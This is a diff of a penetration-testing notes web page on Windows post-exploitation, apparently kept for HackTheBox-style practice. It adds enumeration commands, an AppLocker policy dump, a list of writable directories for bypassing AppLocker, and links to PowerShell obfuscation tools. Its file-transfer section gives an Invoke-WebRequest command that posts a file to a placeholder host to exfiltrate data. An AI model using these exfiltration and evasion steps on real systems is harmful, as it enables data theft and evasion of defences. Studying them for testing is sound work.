@@ -5,8 +5,8 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-07-13T21:02:49 EDT">
-<title>Windows_enum :: Pwny_Sec</title>
+<meta name="revised" content="2019-07-21T18:19:20 EDT">
+<title>Windows :: Pwny_Sec</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -139,17 +139,17 @@
 </li>
     </ul>
 </li>
+<li data-nav-id="/concepts/windows_enum/" class="dd-item active">
+    <div>
+        <a href="/concepts/windows_enum/">
+            Windows
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
 <li data-nav-id="/concepts/bypass/" class="dd-item">
     <div>
         <a href="/concepts/bypass/">
             Windows-Bypass
-        </a><i class="fa fa-circle-thin read-icon"></i>
-    </div>
-</li>
-<li data-nav-id="/concepts/windows_enum/" class="dd-item active">
-    <div>
-        <a href="/concepts/windows_enum/">
-            Windows_enum
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
@@ -415,6 +415,13 @@
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
+<li data-nav-id="/tools/chisel/" class="dd-item">
+    <div>
+        <a href="/tools/chisel/">
+            ChiselTunnel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
 <li data-nav-id="/tools/ftp/" class="dd-item">
     <div>
         <a href="/tools/ftp/">
@@ -563,8 +570,8 @@
     <option value="/concepts/webapppentest/" >
   - 
    WebAppPenTests</option>
+      <option value="/concepts/windows_enum/"  selected>- Windows</option>
       <option value="/concepts/bypass/" >- Windows-Bypass</option>
-      <option value="/concepts/windows_enum/"  selected>- Windows_enum</option>
   
     <option value="/hackthebox/" >
    HackTheBox</option>
@@ -594,7 +601,7 @@
       </div>
     
 
-    <h1>Windows_enum</h1>
+    <h1>Windows</h1>
     
     
     
@@ -611,11 +618,97 @@ $useraccount | set-localuser -password $password
 
 <p><a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines</a></p>
 
-<p>next week minatoTW the creator of arkham and some other hackthebox challenges will be on if all goes well. The time will be moved to around  to 12 pm</p>
+<p><strong>Windows File Type</strong> for running commands scripts executables. I found this list looking up applocker policies.</p>
 
-<p>DIRECTORIES WE CAN ALWAYS CALL HOME</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker">AppLocker</a>   <a href="https://support.microsoft.com/af-za/help/3008790/rules-cannot-be-created-for-the-following-files-error-message-in-applo">ApplockerFileExtentions</a></p>
 
-<pre><code>C:\Windows\Tasks 
+<table>
+<thead>
+<tr>
+<th>Executable</th>
+<th>Scripts</th>
+<th>Installers</th>
+<th>DLL</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>exe</td>
+<td>js</td>
+<td>msi</td>
+<td>dll</td>
+</tr>
+
+<tr>
+<td>com</td>
+<td>ps1</td>
+<td>msp</td>
+<td>ocx</td>
+</tr>
+
+<tr>
+<td></td>
+<td>vbs</td>
+<td></td>
+<td></td>
+</tr>
+
+<tr>
+<td></td>
+<td>cmd</td>
+<td></td>
+<td></td>
+</tr>
+
+<tr>
+<td></td>
+<td>bat</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+<p><strong>HOST BASED FIREWALL</strong></p>
+
+<pre><code>netsh firewall dump
+</code></pre>
+
+<p><strong>LocalGroup Policy</strong></p>
+
+<p>checking group policy is quickly becoming the mantra for pentesters. you can enumerating pretty easily net</p>
+
+<pre><code>net localgroup
+net localgroup users
+net users
+</code></pre>
+
+<p><strong>APPLOCKER</strong></p>
+
+<pre><code>Get-AppLockerPolicy -Effective -XML &gt; meow.xml
+</code></pre>
+
+<p><strong>FILE TRANSFER</strong></p>
+
+<p>The Invoke-WebRequest method can be used to drop files to disk or exfil some files from the system. using the post -method we can send a text/xml file across to a netcat listener.</p>
+
+<p>(DOWNLOAD)</p>
+
+<pre><code>iwr('http://change.me/file.txt') -outfile file.txt
+python -m SimpleHTTPServer 80
+</code></pre>
+
+<p>(UPLOAD)</p>
+
+<pre><code>Invoke-WebRequest -Uri http://change.me -Proxy 'http://change.me:80' -Method Post -InFile meow.xml
+</code></pre>
+
+<p><strong>DIRECTORIES WE CAN ALWAYS CALL HOME</strong></p>
+
+<pre><code>C:\Users\user\AppData\Local\Microsoft\WindowsApps
+
+C:\Windows\Tasks 
 
 C:\Windows\Temp 
 
@@ -646,13 +739,24 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
 C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 </code></pre>
 
+<p>PowerShell obfuscation</p>
+
+<pre><code>https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf
+https://github.com/danielbohannon/Invoke-Obfuscation
+http://pentestit.com/invoke-obfuscation-powershell-command-script-obfuscator/
+https://cobbr.io/ObfuscationDetection.html
+https://gallery.technet.microsoft.com/scriptcenter/Generate-obfuscated-string-6ec72ffe
+https://richardspowershellblog.wordpress.com/2017/10/30/powershell-file-extensions/
+https://www.varonis.com/blog/powershell-obfuscation-stealth-through-confusion-part-i/
+</code></pre>
+
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/concepts/bypass/" title="Windows-Bypass"> <i class="fa fa-chevron-left"></i><label>Windows-Bypass</label></a>
-    <a class="nav nav-next" href="/hackthebox/" title="HackTheBox" style="margin-right: 0px;"><label>HackTheBox</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/concepts/webapppentest/phptypejuggling/" title="PHP Typw Juggling"> <i class="fa fa-chevron-left"></i><label>PHP Typw Juggling</label></a>
+    <a class="nav nav-next" href="/concepts/bypass/" title="Windows-Bypass" style="margin-right: 0px;"><label>Windows-Bypass</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
